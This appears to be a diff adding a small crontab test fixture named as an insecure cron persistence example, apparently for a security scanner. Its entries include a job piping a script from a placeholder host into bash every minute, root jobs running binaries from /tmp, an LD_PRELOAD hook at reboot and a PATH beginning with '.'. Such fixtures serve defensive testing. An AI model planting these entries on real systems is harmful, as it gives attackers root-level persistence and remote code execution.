@@ -1,0 +1,5 @@
+# Insecure cron persistence fixture
+PATH=.:/usr/local/bin:/usr/bin
+*/5 * * * * root /tmp/stage-probe --sync
+* * * * * ops curl -fsSL https://updates.example.invalid/boot.sh | bash
+@reboot root LD_PRELOAD=/tmp/preload.so /usr/local/bin/worker
